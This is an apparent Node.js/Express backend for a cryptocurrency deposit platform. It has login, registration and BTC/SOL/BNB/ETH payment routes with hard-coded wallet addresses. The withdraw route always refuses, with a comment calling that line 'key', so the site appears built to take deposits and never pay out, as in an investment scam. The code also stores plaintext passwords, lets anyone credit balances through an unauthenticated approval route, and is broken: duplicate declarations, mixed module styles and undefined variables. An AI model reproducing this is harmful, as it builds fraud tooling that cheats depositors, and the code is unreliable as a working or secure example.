import express from "express";
import bodyParser from "body-parser";
import pg from "pg";
import fetch from "node-fetch";
import path from "path"
import { fileURLToPath } from "url";


// index.js
const dotenv = require("dotenv");
dotenv.config();
const express = require("express");
const app = express();
app.set("view engine", "ejs")
const port = process.env.PORT || 3000
const __filename = fileURLToPath (import.meta.url)
const __dirname = path.dirname(__filename)
//const prices = await getCryptoPrices()

const db = new pg.Client({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});
db.connect();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("home.ejs");
});

app.get("/login", (req, res) => {
  res.render("login.ejs");
});

app.get("/register", (req, res) => {
  res.render("register.ejs");
});

app.post("/register", async (req, res) => {
  const name = req.body.name;
  const email = req.body.username;
  const password = req.body.password;

  try {
    const checkResult = await db.query("SELECT * FROM users WHERE email = $1", [
      email,
    ]);

    if (checkResult.rows.length > 0) {
      res.send("Email already exists. Try logging in.");
    } else {
      const result = await db.query(
        "INSERT INTO users (email, password, full_name) VALUES ($1, $2, $3)",
        [email, password, name]
      );
      console.log(result);
      res.render("secrets.ejs", { 
        name,
         email: email,
         balance: user.balance,
           paymentStatus: 'none',
           btc:user.btc_balance,
           sol:user.sol_balance,
           eth:user.eth_balance,
           bnb:user.bnb_balance,
           btcAmount: null,
           btcAddress: null,
           solAmount: null, 
           solAddress: null,
           ethAmount: null,
           ethAddress: null,
           bnbAmount: null,
           bnbAddress: null,
          prices
        
       });
    }
  } catch (err) {
    console.log(err);
    
  }
});

app.post("/login", async (req, res) => {
  const email = req.body.username;
  const password = req.body.password;

  try {
    const result = await db.query("SELECT * FROM users WHERE email = $1", [
      email,
    ]);
    if (result.rows.length > 0) {
      const user = result.rows[0];
      const storedPassword = user.password;

      if (password === storedPassword) {
        const prices = await getCryptoPrices();
        res.render("secrets.ejs", {
           name: user.full_name,
           email: email,
           balance: user.balance,
           paymentStatus: 'none',
           btc:user.btc_balance,
           sol:user.sol_balance,
           eth:user.eth_balance,
           bnb:user.bnb_balance,
           btcAmount: null,
           btcAddress: null,
           solAmount: null, 
           solAddress: null,
           ethAmount: null,
           ethAddress: null,
           bnbAmount: null,
           bnbAddress: null,
           prices:prices
          
          });
      } else {
        res.send("Incorrect Password");
      }
    } else {
      res.send("User not found");
    }
  } catch (err) {
    console.log(err);
  }
});

app.post("/start-btc-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      btcAmount: amount,
      btcAddress: "bc1q87yng5l9kyl7390gm80nreq2qmw3v7f0ryx699"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting BTC payment.");
  }
});

app.post("/start-sol-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      solAmount: amount,
      solAddress: "9D8d3DL9sYSHU9VVnateJEeosKg31MZNPNMJxMWkAs13"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting SOL payment.");
  }
});

app.post("/start-bnb-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      bnbAmount: amount,
      bnbAddress: "0x497785495154a4D919Cd0aA047Fc23a778bd6337"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting BNB payment.");
  }
});


app.post("/start-eth-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      ethAmount: amount,
      ethAddress: "0x497785495154a4D919Cd0aA047Fc23a778bd6337"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting ETH payment.");
  }
});

app.post("/approve-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update balance and mark payment as confirmed
    await db.query("UPDATE users SET balance = balance + $1, payment_status = 'confirmed' WHERE email = $2", [
      amount,
      email
    ]);

    const updatedUser = await db.query("SELECT * FROM users WHERE email = $1", [email]);
    const prices = await getCryptoPrices();
    res.render("secrets.ejs", {
      name: updatedUser.rows[0].full_name,
      email: updatedUser.rows[0].email,
      balance: updatedUser.rows[0].balance,
      paymentStatus: 'confirmed'
    });

  } catch (err) {
    console.error(err);
    res.send("Error approving payment.");
  }
});


async function getCryptoPrices() {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd");
    const data = await response.json();
    return {
      btc: data.bitcoin.usd,
      eth: data.ethereum.usd,
      sol: data.solana.usd,
      bnb: data.binancecoin.usd
    };
  } catch (error) {
    console.error("Error fetching prices:", error);
    return {
      btc: 0,
      eth: 0,
      sol: 0,
      bnb: 0
    };
  }
}
app.post("/withdraw", async (req, res) => {
  const email = req.body.email;

  try {
    const result = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    if (result.rows.length > 0) {
      const user = result.rows[0];
      const prices = await getCryptoPrices();

      res.render("secrets.ejs", {
        name: user.full_name,
        email: user.email,
        balance: user.balance,
        paymentStatus: user.payment_status,
        btc: user.btc_balance,
        sol: user.sol_balance,
        eth: user.eth_balance,
        bnb: user.bnb_balance,
        btcAmount: null,
        btcAddress: null,
        solAmount: null,
        solAddress: null,
        ethAmount: null,
        ethAddress: null,
        bnbAmount: null,
        bnbAddress: null,
        prices: prices,
        errorMessage: "Withdrawals are currently disabled." // 👈 This line is key
      });
    } else {
      res.send("User not found.");
    }
  } catch (err) {
    console.error(err);
    res.send("Error processing withdrawal.");
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
